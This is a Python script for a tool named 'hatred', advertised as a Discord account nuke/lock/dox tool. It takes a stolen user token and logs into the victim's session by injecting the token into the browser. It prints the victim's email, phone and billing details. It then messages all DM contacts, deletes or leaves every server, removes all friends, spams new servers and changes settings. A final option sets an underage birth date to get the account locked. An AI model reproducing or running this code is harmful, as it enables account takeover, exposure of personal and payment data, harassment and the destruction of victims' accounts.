import threading
import colorama
import requests
import discord
import random
import os
import re


from colorama import Fore, Style, init
from selenium import webdriver
from bs4 import BeautifulSoup
from datetime import datetime
from itertools import cycle
from time import sleep


client = discord.Client()
colorama.init()
guildsIds = []
friendIds = []
channIds = []
threads = 0


def setup():
    try:
        os.system("mode con cols=135 lines=23")
        os.system(
            "title hatred : discord account nuke/lock/dox : lust, l-ust on github")
    except:
        pass


def clear():
    os.system('cls')
    return


class login(discord.Client):
    async def on_connect(self):
        for guild in self.guilds:
            guildsIds.append(guild.id)

        for friend in self.user.friends:
            friendIds.append(friend.id)

        for channel in self.private_channels:
            channIds.append(channel.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except BaseException:
            print(f'                                        :::')
            print(f'                                        INVALID TOKEN </3')
            print(f'                                        :::')
            sleep(3)
            hatred()


def logins(token):
    webdriver.ChromeOptions.binary_location = r"browser\chrome.exe"
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')
    hatred()


def dox(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}
    try:
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            billing_info = []
        print(f'''
                                        [ UUID  ]: {userID}
                                        [ USER  ]: {userName}
                                        [ 2FA?  ]: {mfa}
                                        [ MAIL  ]: {email}
                                        [ PHONE ]: {phone if phone else "N/A"}
                                        [ TOKEN ]: {token}''')
    except:
        pass

    try:
        for x in requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers,).json():
            y = x["billing_address"]
            name = y["name"]
            address_1 = y["line_1"]
            address_2 = y["line_2"]
            city = y["city"]
            postal_code = y["postal_code"]
            state = y["state"]
            country = y["country"]
            if x["type"] == 1:
                cc_brand = x["brand"]
                cc_first = cc_digits.get(cc_brand)
                cc_last = x["last_4"]
                cc_month = str(x["expires_month"])
                cc_year = str(x["expires_year"])
                data = {
                    f'                                        [ CARD HOLDER  ]: {name}',
                    f'                                        [ CARD BRAND   ]: ' + cc_brand.title(
                    ),
                    f'                                        [ CARD NUMBER  ]: '.join(z if (
                        i + 1) % 2 else z + " " for i, z in enumerate((cc_first if cc_first else "*") + ("*" * 11) + cc_last)),
                    f'                                        [ CARD EXPIRY  ]: ' + (
                        "0" + cc_month if len(cc_month) < 2 else cc_month) + "/" + cc_year[2:4],
                    f"                                        [ CARD ADDY 1  ]: " + address_1,
                    f"                                        [ CARD ADDY 2  ]: " +
                    address_2 if address_2 else "",
                    f"                                        [ CARD CITY    ]: " + city,
                    f"                                        [ CARD POSTAL  ]: " + postal_code,
                    f"                                        [ CARD STATE   ]: " +
                    state if state else "",
                    f"                                        [ CARD COUNTRY ]: " + country,
                    f"                                        [ DEFAULT PAYM ]: " + x["default"],
                }

            elif x["type"] == 2:
                data = {
                    f"                                        [ PAYPAL NAME    ]: " + name,
                    f"                                        [ PAYPAL EMAIL   ]: " + x["email"],
                    f"                                        [ PAYPAL ADDY1   ]: " + address_1,
                    f"                                        [ PAYPAL ADDY2   ]: " +
                    address_2 if address_2 else "",
                    f"                                        [ PAYPAL CITY    ]: " + city,
                    f"                                        [ PAYPAL ZIPC    ]: " + postal_code,
                    f"                                        [ PAYPAL STATE   ]: " +
                    state if state else "",
                    f"                                        [ PAYPAL COUNTRY ]: " + country,
                    f"                                        [ DEFAULT PAYM   ]: " + x["default"],
                }

        print(billing_info.append(data))
    except:
        pass
    input('')
    hatred()


def nuke(token):
    headers = {'Authorization': token}
    print(f'                                        ENTER TO CONFIRM:')
    input(f'                                        [>] => ')
    print(
        f'                                        [!] NUKING ACCOUNT : LUST, L-UST ON GITHUB')
    print()
    for id in channIds:
        try:
            requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={
                          "content": "i've been hit with 'hatred' => lust, l-ust on github : https://github.com/l-ust | join us @ https://discord.gg/e4tDdqxgWx"})
            print(
                f'                                        [=>] dm\'ed => {id}')
        except Exception as e:
            print(
                f"                                        [!] error was thrown; {e}")
    print(f'                                        ::: ::: ::: :::')
    print(f'                                        DM\'D ALL AVAIL. ID\'S : LUST, L-UST ON GITHUB')
    print(f'                                        ::: ::: ::: :::')

    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
            print(
                f'                                        [<=] removed guild => {guild}')
        except Exception as e:
            print(
                f"                                        [!] error was thrown; {e}")

    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)
            print(
                f'                                        [<=] left guild => {guild}')
        except Exception as e:
            print(
                f"                                        [!] error was thrown; {e}")
    print(f'                                        ::: ::: ::: :::')
    print(f'                                        DELETED/REMOVED ALL GUILDS : LUST, L-UST ON GITHUB')
    print(f'                                        ::: ::: ::: :::')

    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)
            print(
                f'                                        [<=] removed friend => {friend}')
        except Exception as e:
            print(
                f"                                        [!] error was thrown; {e}")
    print(f'                                        ::: ::: ::: :::')
    print(f'                                        REMOVED ALL FRIENDS : LUST, L-UST ON GITHUB')
    print(f'                                        ::: ::: ::: :::')

    for i in range(20):
        try:
            payload = {'name': 'lust, l-ust on github',
                       'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v6/guilds',
                          headers=headers, json=payload)
            print(
                f'                                        [++] guild created => [{i}]')
        except Exception as e:
            print(
                f"                                        [!] error was thrown; {e}")
    print(f'                                        ::: ::: ::: :::')
    print(
        f'                                        MASS-GUILDED => {i} SERVERS MADE : LUST, L-UST ON GITHUB')
    print(f'                                        ::: ::: ::: :::')

    payload = {
        'theme': "light",
        'locale': "ja", 'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    try:
        requests.patch("https://discord.com/api/v8/users/@me/settings",
                       headers=headers, json=payload)
    except:
        pass
    print(f'                                        ::: ::: ::: :::')
    print(f'                                        DARK/LIGHT + LANG. SWITCHING => CTRL+C TO END : LUST, L-UST ON GITHUB')
    print(f'                                        ::: ::: ::: :::')
    try:
        modes = cycle(["light", "dark"])
        for i in range(31):
            setting = {'theme': next(modes), 'locale': random.choice(
                ['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
            requests.patch(
                "https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
            print(
                f'                                        [><] view changed => {setting["theme"]} | {setting["locale"]} | {i} times! ')
    except KeyboardInterrupt:
        pass

    print(f'                                        ::: ::: ::: :::')
    print(f'                                        ACCOUNT NUKED : LUST, L-UST ON GITHUB')
    print(f'                                        ::: ::: ::: :::')
    print(f'                                        WOULD YOU LIKE TO ATTEMPT TO LOCK THE ACCOUNT? (y/n)')

    lock = input(f'                                        [>] => ')

    if lock == 'y':
        try:
            requests.patch('https://discord.com/api/v6/users/@me',
                           headers={'Authorization': token}, json={'date_of_birth': '2016-1-1'})
        except:
            pass

        try:
            for i in range(5):
                requests.put('https://discord.com/api/v8/users/@me/relationships/781022407745994752',
                             headers={'Authorization': token})
                requests.delete(
                    'https://discord.com/api/v8/users/@me/relationships/781022407745994752', headers={'Authorization': token})
                print(
                    f'                                        [XX] lock method 1 => executed | {i} ')
        except:
            pass
        try:
            for i in range(2):
                requests.post(
                    "https://discord.com/api/v6/invite/e4tDdqxgWx", headers={"Authorization": token})
                requests.delete(
                    f'https://canary.discord.com/api/v8/users/@me/guilds/789534335073124372', headers={'Authorization': token})
                print(
                    f'                                        [XX] lock method 2 => executed | {i} ')
        except:
            pass

        try:
            for i in range(20):
                requests.post(
                    f"https://discord.com/api/v8/invites/python", headers={'Authorization': token})
                requests.delete(
                    f'https://canary.discord.com/api/v8/users/@me/guilds/267624335836053506', headers={'Authorization': token})
                requests.post(f"https://discord.com/api/v8/invites/code",
                              headers={'Authorization': token})
                requests.delete(
                    f'https://canary.discord.com/api/v8/users/@me/guilds/172018499005317120', headers={'Authorization': token})
                print(
                    f'                                        [XX] lock method 3 => executed | {i} ')
        except:
            pass
        ids = [
            768496306556502068,
            764577901806485545,
            763384611925000193,
            750317688944853064,
            599636206719860754,
            754619738541260821,
            477784992525844480,
            771475415696015383,
            764513309419372585,
            769421693009395742,
            772998756555685899,
            769333689465045003
        ]
        for i in range(20):
            try:
                dID = client.fetch_user(random.choice(ids))
                username = dID.name
                discrim = dID.discriminator
                requests.post("https://discord.com/api/v8/users/@me/relationships", headers={
                              'Authorization': token}, json={'username': username, 'discriminator': int(discrim)})
                print(
                    f'                                        [XX] lock method 4 => executed | {i} ')
            except:
                pass
        print(f'                                        ::: ::: ::: :::')
        print(f'                                        ATTEMPTED TO LOCK ACCOUNT : LUST, L-UST ON GITHUB')
        print(f'                                        ::: ::: ::: :::')
        input(f'                                        [>] => ')
        hatred()

    if lock == 'n':
        hatred()


def hatred():
    global threads
    threads = 0

    clear()

    print(f'''{Style.DIM}
                                        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                                      LUST, L-UST ON GITHUB
                                         ██╗  ██╗ █████╗ ████████╗██████╗ ███████╗██████╗ 
                                         ██║  ██║██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██╔══██╗
                                         ███████║███████║   ██║   ██████╔╝█████╗  ██║  ██║
                                         ██╔══██║██╔══██║   ██║   ██╔══██╗██╔══╝  ██║  ██║
                                         ██║  ██║██║  ██║   ██║   ██║  ██║███████╗██████╔╝
                                         ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═════╝{Fore.RESET}
                                              HATRED => DISCORD ACCOUNT NUKE/LOCK/DOX          
                                        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                        :::
                                        [{Fore.RED}1{Fore.RESET}] => ACCOUNT-NUKE/LOCK 
                                        [{Fore.RED}2{Fore.RESET}] => ACCOUNT-DOX
                                        [{Fore.RED}3{Fore.RESET}] => ACCOUNT LOG-IN
                                        [{Fore.RED}4{Fore.RESET}] => EXIT
                                        :::'''.replace('█',f'{Fore.WHITE}█{Fore.RED}'))
    decision = str(input(f'                                        [>] => '))

    if decision == '1':
        print(f'                                        :::')
        print(f'                                        TOKEN:')
        token = str(input(f'                                        [>] => '))

        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        r = requests.get(
            'https://discord.com/api/v6/users/@me', headers=headers)

        if r.status_code == 200:
            threads = 100
            login().run(token)
            if threading.active_count() < threads:
                t = threading.Thread(target=nuke, args=(token, ))
                t.start()
                return
        else:
            print(f'                                        :::')
            print(f'                                        INVALID TOKEN </3')
            input(f'                                        [>] => ')
            hatred()

    elif decision == '2':
        print(f'                                        :::')
        print(f'                                        TOKEN:')
        token = str(input(f'                                        [>] => '))
        dox(token)

    elif decision == '3':
        print(f'                                        :::')
        print(f'                                        TOKEN:')
        token = str(input(f'                                        [>] => '))

        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        r = requests.get(
            'https://discord.com/api/v6/users/@me', headers=headers)

        if r.status_code == 200:
            logins(token)
        else:
            print(f'                                        :::')
            print(f'                                        INVALID TOKEN </3')
            input(f'                                        [>] => ')
            hatred()

    elif decision == '4':
        exit(0)
    elif decision == '':
        hatred()


if __name__ == "__main__":
    setup()
    hatred()
